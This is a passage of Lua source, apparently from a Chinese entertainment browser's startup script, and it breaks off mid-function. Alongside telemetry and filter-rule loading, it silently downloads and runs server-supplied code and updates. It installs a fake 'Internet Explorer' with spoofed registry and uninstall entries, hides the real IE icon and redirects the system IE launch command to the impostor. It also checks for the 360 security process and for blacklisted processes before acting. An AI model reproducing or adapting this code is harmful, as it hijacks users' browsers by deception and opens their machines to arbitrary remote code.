local tipUtil = XLGetObject("API.Util")
local tipAsynUtil = XLGetObject("API.AsynUtil")
local gnLastReportRunTmUTC = 0

-----------------

function RegisterFunctionObject()
	local strFunhelpPath = __document.."\\..\\functionhelper.lua"
	XLLoadModule(strFunhelpPath)
	
	local tFunH = XLGetGlobal("YBYL.FunctionHelper")
	if type(tFunH) ~= "table" then
		return false
	else
		return true
	end
end


function LoadIEHelper()
	local strIEHelperPath = __document.."\\..\\IEMenuHelper.lua"
	XLLoadModule(strIEHelperPath)
end


function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end


function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end

function ShowMainTipWnd(objMainWnd)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	objMainWnd:Show(5)
	objMainWnd:SetTitle("元宝娱乐浏览器")
	SendStartupReport(true)
	FunctionObj.SetWindowMax()
end


function InitAdvFilter()
	SendRuleListtToFilterThread()
	SetWebRoot()
	InitFilterState()
end


function InitFilterState()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bOpenFilter = FunctionObj.GetFilterState()
	FunctionObj.SetFilterState(bOpenFilter)
end


function SendStartupReport(bShowWnd)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tStatInfo = {}
	
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	tStatInfo.strEL = strSource or ""
	
	if not bShowWnd then
		tStatInfo.strEC = "launch"  --进入上报
		tStatInfo.strEA = FunctionObj.GetInstallSrc() or ""
		tStatInfo.strEL = strSource or ""
	else
		tStatInfo.strEC = "showui" 	 --展示上报
		tStatInfo.strEA = strSource or ""
		tStatInfo.strEL = FunctionObj.GetMinorVerFormat() or ""
	end
	
	tStatInfo.strEV = 1
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		item:KillTimer(id)
		FunctionObj.TipConvStatistic(tStatInfo)
	end, 1000)
end


function SendUserInfoReport()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	local bHasSend = CheckHasSendUserInfo()
	if bHasSend then
		return
	end
	
	local tStatBrow = {}
	
	local strSource = FunctionObj.GetInstallSrc()
	
	tStatBrow.strEL = strSource or ""
	tStatBrow.strEV = 1
	tStatBrow.strEC = "defaultbrowser"  --默认浏览器
	tStatBrow.strEA = FunctionObj.GetDefaultBrowser() or ""
	FunctionObj.DelayTipConvStatistic(tStatBrow)
	
	local tStatHP = {}
	tStatHP.strEL = strSource or ""
	tStatHP.strEV = 1
	tStatHP.strEC = "iehomepage"  --首页
	tStatHP.strEA = FunctionObj.GetHomePageFromReg() or ""
	FunctionObj.DelayTipConvStatistic(tStatHP)
	
	SaveLastReportBrowser()
end


function CheckHasSendUserInfo()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	local nLastReportBrowser = tUserConfig["nLastReportBrowser"] or 0
	
	if FunctionObj.CheckTimeIsAnotherDay(nLastReportBrowser) then
		return false
	else
		return true
	end
end


function SaveLastReportBrowser()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tUserConfig["nLastReportBrowser"] = tipUtil:GetCurrentUTCTime()
	
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function GenDecFilePath(strEncFilePath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strKey = "7uxSw0inyfnTawtg"
	local strDecString = tipUtil:DecryptFileAES(strEncFilePath, strKey)
	if type(strDecString) ~= "string" then
		FunctionObj.TipLog("[GenDecFilePath] DecryptFileAES failed : "..tostring(strEncFilePath))
		return ""
	end
	
	local strTmpDir = tipUtil:GetSystemTempPath()
	if not tipUtil:QueryFileExists(strTmpDir) then
		FunctionObj.TipLog("[GenDecFilePath] GetSystemTempPath failed strTmpDir: "..tostring(strTmpDir))
		return ""
	end
	
	local strCfgName = tipUtil:GetTmpFileName() or "data.dat"
	local strCfgPath = tipUtil:PathCombine(strTmpDir, strCfgName)
	tipUtil:WriteStringToFile(strCfgPath, strDecString)
	return strCfgPath
end


function GetVideoRulePath()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strServerVideoRulePath = FunctionObj.GetCfgPathWithName("ServerYBYLVideo.dat")
	if IsRealString(strServerVideoRulePath) and tipUtil:QueryFileExists(strServerVideoRulePath) then
		return strServerVideoRulePath
	end

	local strVideoRulePath = FunctionObj.GetCfgPathWithName("YBYLVideo.dat")
	if IsRealString(strVideoRulePath) and tipUtil:QueryFileExists(strVideoRulePath) then
		return strVideoRulePath
	end
	
	return ""
end


function CheckForceVersion(tForceVersion)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if type(tForceVersion) ~= "table" then
		return false
	end

	local bRightVer = false
	
	local strCurVersion = FunctionObj.GetYBYLVersion()
	local _, _, _, _, _, strCurVersion_4 = string.find(strCurVersion, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
	local nCurVersion_4 = tonumber(strCurVersion_4)
	if type(nCurVersion_4) ~= "number" then
		return bRightVer
	end
	for iIndex = 1, #tForceVersion do
		local strRange = tForceVersion[iIndex]
		local iPos = string.find(strRange, "-")
		if iPos ~= nil then
			local lVer = tonumber(string.sub(strRange, 1, iPos - 1))
			local hVer = tonumber(string.sub(strRange, iPos + 1))
			if lVer ~= nil and hVer ~= nil and nCurVersion_4 >= lVer and nCurVersion_4 <= hVer then
				bRightVer = true
				break
			end
		else
			local verFlag = tonumber(strRange)
			if verFlag ~= nil and nCurVersion_4 == verFlag then
				bRightVer = true
				break
			end
		end
	end
	
	return bRightVer
end


function TryForceUpdate(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if FunctionObj.CheckIsUpdating() then
		FunctionObj.TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
		return
	end

	local bPassCheck = FunctionObj.CheckCommonUpdateTime(1)
	if not bPassCheck then
		FunctionObj.TipLog("[TryForceUpdate] CheckCommonUpdateTime failed")
		return		
	end

	local tNewVersionInfo = tServerConfig["tNewVersionInfo"] or {}
	local tForceUpdate = tNewVersionInfo["tForceUpdate"]
	if(type(tForceUpdate)) ~= "table" then
		return 
	end
	
	local strCurVersion = FunctionObj.GetYBYLVersion()
	local strNewVersion = tForceUpdate.strVersion		
	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
		or not FunctionObj.CheckIsNewVersion(strNewVersion, strCurVersion) then
		return
	end
	
	local tVersionLimit = tForceUpdate["tVersion"]
	local bPassCheck = CheckForceVersion(tVersionLimit)
	FunctionObj.TipLog("[TryForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then
		return 
	end
	
	FunctionObj.SetIsUpdating(true)
	
	FunctionObj.DownLoadNewVersion(tForceUpdate, function(strRealPath) 
		FunctionObj.SetIsUpdating(false)
	
		if not IsRealString(strRealPath) then
			return
		end
		
		FunctionObj.SaveCommonUpdateUTC()
		local strCmd = " /write /silent /run"
		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end


function TryExecuteExtraCode(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
	local strURL = tExtraHelper["strURL"]
	local strMD5 = tExtraHelper["strMD5"]
	
	if not IsRealString(strURL) then
		return
	end
	local strHelperName = FunctionObj.GetFileSaveNameFromUrl(strURL)
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
	
	FunctionObj.DownLoadFileWithCheck(strURL, strSavePath, strMD5
	, function(bRet, strRealPath)
		FunctionObj.TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL)
		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
				
		if bRet < 0 then
			return
		end
		
		FunctionObj.TipLog("[TryExecuteExtraCode] begin execute extra helper")
		XLLoadModule(strRealPath)
	end)	
end


function FixUserConfig(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
	if type(tUserConfigInServer) ~= "table" then
		return
	end

	local tLocalUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tLocalUserConfig["nMaxUrlHistroy"] = tUserConfigInServer["nMaxUrlHistroy"] or 100
	tLocalUserConfig["nMaxUserCollect"] = tUserConfigInServer["nMaxUserCollect"] or 100
		
	if IsRealString(tUserConfigInServer["strOpenTabURL"]) then
		tLocalUserConfig["strOpenTabURL"] = tUserConfigInServer["strOpenTabURL"]
	end
	
	if type(tUserConfigInServer["tOpenStupURL"]) == "table" and #tUserConfigInServer["tOpenStupURL"] >1 then
		tLocalUserConfig["tOpenStupURL"] = tUserConfigInServer["tOpenStupURL"]
	end
	
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function CheckServerRuleFile(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tServerData = FetchValueByPath(tServerConfig, {"tServerData"}) or {}
	
	local strServerVideoURL = FetchValueByPath(tServerData, {"tServerYBYLVideo", "strURL"})
	local strServerVideoMD5 = FetchValueByPath(tServerData, {"tServerYBYLVideo", "strMD5"})
	
	if not IsRealString(strServerVideoURL) or not IsRealString(strServerVideoMD5) then
		FunctionObj.TipLog("[CheckServerRuleFile] get server rule info failed , start tipmain ")
		
		-- TipMain()
		return
	end
	
	local strVideoSavePath = FunctionObj.GetCfgPathWithName("ServerYBYLVideo.dat")
	if not IsRealString(strVideoSavePath) or not tipUtil:QueryFileExists(strVideoSavePath) then
		strVideoSavePath = FunctionObj.GetCfgPathWithName("YBYLVideo.dat")
	end
		
	local strDataVMD5 = tipUtil:GetMD5Value(strVideoSavePath)
	if tostring(strDataVMD5) == strServerVideoMD5 then
		-- TipMain()
		return
	end

	local strPath = FunctionObj.GetCfgPathWithName("ServerYBYLVideo.dat")
	FunctionObj.NewAsynGetHttpFile(strServerVideoURL, strPath, false
		, function(bRet, strVideoPath)
			FunctionObj.TipLog("[DownLoadServerRule] bRet:"..tostring(bRet)
					.." strVideoPath:"..tostring(strVideoPath))
				
			FunctionObj.TipLog("[DownLoadServerRule] download finish, start tipmain ")
			-- TipMain()
			
		end, 5*1000)
end


function AnalyzeServerConfig(nDownServer, strServerPath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
		FunctionObj.TipLog("[AnalyzeServerConfig] Download server config failed , start tipmain ")
		-- TipMain()
		return	
	end
	
	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
	TryForceUpdate(tServerConfig)
	FixUserConfig(tServerConfig)
	CheckServerRuleFile(tServerConfig)
	TryExecuteExtraCode(tServerConfig)
end


function SendRuleListtToFilterThread()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strVideoRulePath = GetVideoRulePath()
	if not IsRealString(strVideoRulePath) or not tipUtil:QueryFileExists(strVideoRulePath) then
		return false
	end

	local strDecVideoRulePath = GenDecFilePath(strVideoRulePath)
	if not IsRealString(strDecVideoRulePath) then
		return false	
	end
	local bSucc = tipUtil:LoadVideoRules(strDecVideoRulePath)
	if not bSucc then
		FunctionObj.TipLog("[SendRuleListtToFilterThread] LoadVideoRules failed")
		return false
	end
	
	tipUtil:DeletePathFile(strDecVideoRulePath)
	
	return true
end


function SetWebRoot()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strBrowserExePath = FunctionObj.GetExePath()
	local strWebRootDir = tipUtil:PathCombine(strBrowserExePath, "..\\..\\filterres")
	
	if not IsRealString(strWebRootDir) or not tipUtil:QueryFileExists(strWebRootDir) then
		FunctionObj.TipLog("[SetWebRoot] get WebRoot failed")
		return
	end
	
	tipUtil:FYbSetWebRoot(strWebRootDir)
end


function StartRunCountTimer()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	FunctionObj.SendRunTimeReport(0, false)
	
	local nTimeSpanInSec = 10 * 60 
	local nTimeSpanInMs = nTimeSpanInSec * 1000
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
		FunctionObj.SendRunTimeReport(nTimeSpanInSec, false)
		XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
	end, nTimeSpanInMs)
end


--弹出窗口--
local g_tPopupWndList = {
	[1] = {"TipAboutWnd", "TipAboutTree"},
	-- [2] = {"TipIntroduceWnd", "TipIntroduceTree"},
	-- [3] = {"TipConfigWnd", "TipConfigTree"},
}


function CreatePopupTipWnd()
	for key, tItem in pairs(g_tPopupWndList) do
		local strHostWndName = tItem[1]
		local strTreeName = tItem[2]
		local bSucc = CreateWndByName(strHostWndName, strTreeName)
	end
	
	return true
end

function CreateWndByName(strHostWndName, strTreeName)
	local bSuccess = false
	local strInstWndName = strHostWndName..".Instance"
	local strInstTreeName = strTreeName..".Instance"
	
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate(strHostWndName, "HostWndTemplate" )
	if frameHostWndTemplate then
		local frameHostWnd = frameHostWndTemplate:CreateInstance(strInstWndName)
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate(strTreeName, "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance(strInstTreeName)
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local iRet = frameHostWnd:Create()
					if iRet ~= nil and iRet ~= 0 then
						bSuccess = true
					end
				end
			end
		end
	end

	return bSuccess
end

function DestroyPopupWnd()
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")

	for key, tItem in pairs(g_tPopupWndList) do
		local strPopupWndName = tItem[1]
		local strPopupInst = strPopupWndName..".Instance"
		
		local objPopupWnd = hostwndManager:GetHostWnd(strPopupInst)
		if objPopupWnd then
			hostwndManager:RemoveHostWnd(strPopupInst)
		end
	end
end


function PopTipWnd(OnCreateFunc)
	local bSuccess = false
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate("TipMainWnd", "HostWndTemplate" )
	local frameHostWnd = nil
	if frameHostWndTemplate then
		frameHostWnd = frameHostWndTemplate:CreateInstance("YBYLTipWnd.MainFrame")
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate("TipPanelTree", "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance("YBYLTipWnd.MainObjectTree")
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local ret = OnCreateFunc(uiObjectTree)
					if ret then
						local iRet = frameHostWnd:Create()
						if iRet ~= nil and iRet ~= 0 then
							bSuccess = true
							ShowMainTipWnd(frameHostWnd)
						end
					end
				end
			end
		end
	end
	if not bSuccess then
		local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
		FunctionObj:FailExitTipWnd(4)
	end
end


function TrySetDefaultBrowser()
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	local strIEPath = GetIEPath()
	if not IsRealString(strIEPath) or not tipUtil:QueryFileExists(strIEPath) then
		return
	end	
	
	tipUtil:ShellExecute(0, "open", strIEPath, " /setdefault", 0, "SW_HIDE")
end

function ProcessCommandLine()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bRet, strURL = FunctionObj.GetCommandStrValue("/openlink")
	if bRet and IsRealString(strURL) then
		FunctionObj.OpenURLInNewTab(strURL)
	end
	
	TryOpenURLWhenStup()
	TryInstallIE()
end


function TryOpenURLWhenStup()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	-- local strRegPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\ShowIntroduce"
	-- local strValue = FunctionObj.RegQueryValue(strRegPath)
	
	-- if not IsNilString(strValue) then
		-- return
	-- end
	
	FunctionObj.OpenURLWhenStup()
end



----------install ie ----------
function TryInstallIE()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	if bRet and tostring(strSource) == "installfinish" then
		return  --安装包来源 不执行
	end	
	
	local strRegFSPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\regie"
	local nValue = FunctionObj.RegQueryValue(strRegFSPath)
	if IsNilString(nValue) then 
		FunctionObj.TipLog("[TryInstallIE] no regie in register")
		return   --注册表无标记   
	end
	
	local strRegIEPath = "HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path"
	local strIEPath = FunctionObj.RegQueryValue(strRegIEPath)
	if IsRealString(strIEPath) then
		FunctionObj.TipLog("[TryInstallIE] Has Installed IE")
		return --已经安装
	end
	if not tipUtil:QueryFileExists(GetIEPath()) then
		FunctionObj.TipLog("[TryInstallIE] check IE path failed")
		return --没有释放
	end
	
	DownLoadSetupConfig(AnalyseSetupConfig)
end


function DownLoadSetupConfig(fnCallBack)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strURL = "http://www.91yuanbao.com/cmi/iesetupconfig.js"
	local strSysTempDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSysTempDir, "iesetupconfig.js")
	
	local strStamp = FunctionObj.GetTimeStamp()
	local strURLFix = strURL..strStamp
	
	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false, 
		function(bRet, strIniPath)
			FunctionObj.TipLog("[DownLoadSetupConfig] NewAsynGetHttpFile bRet : "..tostring(bRet)
								.."  strSavePath: "..tostring(strSavePath))
		
			if bRet ~= 0 or not tipUtil:QueryFileExists(strIniPath) then
				fnCallBack("")
				return
			end
			
			fnCallBack(strIniPath)			
		end, 10*1000)
end


function AnalyseSetupConfig(strIniPath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tBlackList = GetBlackListForIE(strIniPath)
	
	for _, strProcessName in pairs(tBlackList) do
		local strExeName = string.lower(tostring(strProcessName))..".exe"
		local bExists = tipUtil:QueryProcessExists(strExeName)
		if bExists then
			FunctionObj.TipLog("[AnalyseSetupConfig] blacklist process strExeName: "..tostring(strExeName))
			return --黑名单目录
		end
	end
	
	FunctionObj.TipLog("[AnalyseSetupConfig] begin install ie")
	DoInstallIE(strIniPath)
	
	local strRegFSPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\regie"
	FunctionObj.RegDeleteValue(strRegFSPath)
	TrySetDefaultBrowser()
end


function GetBlackListForIE(strIniPath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tBlackList = {}
	local strBlackList, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "blacklist")
	if not bRet or not IsRealString(strBlackList) then
		return tBlackList
	end

	tBlackList = FunctionObj.SplitStringBySeperator(strBlackList, ",")
	return tBlackList
end


function DoInstallIE(strIniPath)
	WriteIERegister()
	WriteIEShortCut(strIniPath)
	
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bIs64 = FunctionObj.CheckIs64OS()
	FunctionObj.CommitRegOperation(bIs64)
	tipUtil:RefleshIcon(nil)
	
	SendInstallIEReport()
end


function GetIETID()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strTID = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\YBYL\\ietid")
	if IsRealString(strTID) then
		return strTID
	end

	return "UA-61921868-1"
end


function SendInstallIEReport()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local rdRandom = tipUtil:GetCurrentUTCTime()
	local strDefaultNil = "null"
	
	local strCID = FunctionObj.GetPeerID()
	local strIEVersion = GetFakeIEVersion() 
	local strInstallSrc = FunctionObj.GetInstallSrc()
	local _, _, strMinorVer = string.find(strIEVersion, "%d+%.%d+%.%d+%.(%d+)")
	
	nVer = tonumber(strMinorVer) or ""
	strMinorVer = string.format("%02d", nVer) 
	strMinorVer = "B"..strMinorVer	
	
	local strIETID = GetIETID()
	local strUrl = "http://www.google-analytics.com/collect?v=1&tid="..strIETID.."&cid="..tostring(strCID)
						.."&t=event&ec=".."installiefromYBLaunch".."&ea="..tostring(strInstallSrc)
						.."&el="..tostring(strMinorVer).."&ev="..tostring(1)
	tipAsynUtil:AsynSendHttpStat(strUrl, function()	end)
	
	local strUrl = "http://www.google-analytics.com/collect?v=1&tid="..strIETID.."&cid="..tostring(strCID)
						.."&t=event&ec=".."install".."&ea="..tostring(strInstallSrc)
						.."&el="..tostring(strMinorVer).."&ev="..tostring(1)
	tipAsynUtil:AsynSendHttpStat(strUrl, function()	end)
end


function WriteIERegister()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bIs64 = FunctionObj.CheckIs64OS()
	
	local strIEPath = GetIEPath()
	FunctionObj.CreateRegKey("HKEY_CURRENT_USER","SOFTWARE\\iexplorer")
	bret = FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path", strIEPath, bIs64)

	local strPid = FunctionObj.GetPeerID()
	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\PeerId", strPid, bIs64)
	
	local strInstallSrc = FunctionObj.GetInstallSrc()
	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallSource", strInstallSrc, bIs64)
	
	local strInstallDir = GetIEDir()
	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstDir", strInstallDir, bIs64)
	
	local strCurrentTime = tipUtil:GetCurrentUTCTime()
	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallTimes", strCurrentTime, bIs64)
	
	-------
	local bInfMode = true
	FunctionObj.CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe", bIs64)
	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe\\", strIEPath, bIs64, bInfMode)
	
	FunctionObj.CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe", bIs64)
	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayName", "Internet Explorer", bIs64, bInfMode)
	
    local strUninstPath = tipUtil:PathCombine(strInstallDir, "uninst.exe")
	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\UninstallString", strUninstPath, bIs64, bInfMode)
	
	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayIcon", strIEPath, bIs64, bInfMode)
	
	local strIEVersion = GetFakeIEVersion()
	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayVersion", strIEVersion, bIs64, bInfMode)
	
	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\URLInfoAbout", "", bIs64, bInfMode)
	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\Publisher", "iexplorer", bIs64, bInfMode)
end


function GetIEPath()
	local strIEDir = GetIEDir()
	if not IsRealString(strIEDir) then
		return ""
	end
	
	local strIEPath = tipUtil:PathCombine(strIEDir, "program\\iexplore.exe")
	return strIEPath or ""
end


function GetIEDir()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bOk, strBaseDir = FunctionObj.QueryAllUsersDir()
	if not bOk then
		return ""
	end
	
	local strIEDir = tipUtil:PathCombine(strBaseDir, "iexplorer")
	return strIEDir or ""
end


function GetFakeIEVersion()
	local strIEPath = GetIEPath()
	if not IsRealString(strIEPath) then
		return ""
	end
	
	return tipUtil:GetFileVersionString(strIEPath)
end


function WriteIEShortCut(strIniPath)
	CheckNeedHideICO(HideIEIco, strIniPath)
	
	WriteStartMenuSC()
	WriteStartMenuProgramSC()
	WriteQuickLaunchSC()
	WriteDesktopSC(strIniPath)
	WriteRegStartMenuInternet()
	
	--win7 pin
	WriteStartPin()
	WriteTaskBarPin()
end


function WriteRegStartMenuInternet()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tRootKey = {"HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE"}
	
	local bIs64 = FunctionObj.CheckIs64OS()
	
	for _, strRootKey in pairs(tRootKey) do
		local strCommandPath = strRootKey.."\\Software\\Clients\\StartMenuInternet\\iexplore.exe\\shell\\open\\command\\"
		local strValue = FunctionObj.RegQueryValue(strCommandPath)
		if not IsNilString(strValue) then
			local strFakeIEPath = GetIEPath()
			FunctionObj.RegSetValue(strCommandPath, "\""..strFakeIEPath.."\"", bIs64)
			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\StartMenuInternet", strValue, bIs64)
		end
	end
end

function GetIELnkBakDir()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bOk, strBaseDir = FunctionObj.QueryAllUsersDir()
	if not bOk then
		return ""
	end
	local strIELnkBakDir = tipUtil:PathCombine(strBaseDir, "IECFG\\lnkbak")
	if not tipUtil:QueryFileExists(strIELnkBakDir) then
		tipUtil:CreateDir(strIELnkBakDir)
	end
	return strIELnkBakDir
end

function CutBackUpLnk(strSourcePath,strNamePreFix)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strIELnkBakDir = GetIELnkBakDir()
	local strFileName = FunctionObj.GetFileNameFromPath(strSourcePath)
	local strNameWithPreFix = strNamePreFix .. "_" .. strFileName .. ".lnk"
	local strTargetPath = tipUtil:PathCombine(strIELnkBakDir, strNameWithPreFix)
	tipUtil:CopyPathFile(strSourcePath, strTargetPath)
	tipUtil:DeletePathFile(strSourcePath)
end

function CopyBackUpLnk(strSourcePath,strNamePreFix)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strIELnkBakDir = GetIELnkBakDir()
	local strFileName = FunctionObj.GetFileNameFromPath(strSourcePath)
	local strNameWithPreFix = strNamePreFix .. "_" .. strFileName .. ".lnk"
	local strTargetPath = tipUtil:PathCombine(strIELnkBakDir, strNameWithPreFix)
	tipUtil:CopyPathFile(strSourcePath, strTargetPath)
end


function CheckIsFakeIELnk(strFilePath)
	if not IsRealString(strFilePath) or not tipUtil:QueryFileExists(strFilePath) then
		return false
	end
	
	return false
end


function CheckNeedHideICO(fnCallBack, strIniPath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bNeedHideICO = true

	function DoCheck360()
		local bExists = tipUtil:QueryProcessExists("360tray.exe")
		if bExists then
			fnCallBack(not bNeedHideICO)
		else
			fnCallBack(bNeedHideICO)
		end
	end
		
	if not tipUtil:QueryFileExists(strIniPath) then
		fnCallBack(bNeedHideICO)
		return 
	end
	
	local nIgnore360, bRet = tipUtil:ReadINI(strIniPath, "entryaction", "dtcheck")
	if bRet and tostring(nIgnore360) == "1" then
		DoCheck360()
		return
	end
	
	fnCallBack(bNeedHideICO)
end


function HideIEIco(bNeedHide)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	if not bNeedHide then
		return
	end
	
	FunctionObj.TipLog("[HideIEIco] beging hide system ie")
	local bIs64 = FunctionObj.CheckIs64OS()
	local bInfMode = true
	
	local strRegRoot = {"HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE"}
	for _, strRoot in pairs(strRegRoot) do
		local strPanelReg = strRoot.."\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel"
								.."\\{871C5380-42A0-1069-A2EA-08002B30309D}"
		FunctionObj.RegSetValue(strPanelReg, 1, bIs64, bInfMode)
	
		local strMenuReg = strRoot.."\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\ClassicStartMenu"
								.."\\{871C5380-42A0-1069-A2EA-08002B30309D}"
		FunctionObj.RegSetValue(strMenuReg, 1, bIs64, bInfMode)
	end
	
	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HideIEIcon", "1", bIs64)
end


--开始菜单目录
function WriteStartMenuSC()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local nCSIDL_STARTMENU = 0xB
	local nCSIDL_COMMON_STARTMENU = 0x16
	local tStartMenuClsidl = {nCSIDL_STARTMENU, nCSIDL_COMMON_STARTMENU}
	
	for _, nCsidl in pairs(tStartMenuClsidl) do
		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidl)
		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
		
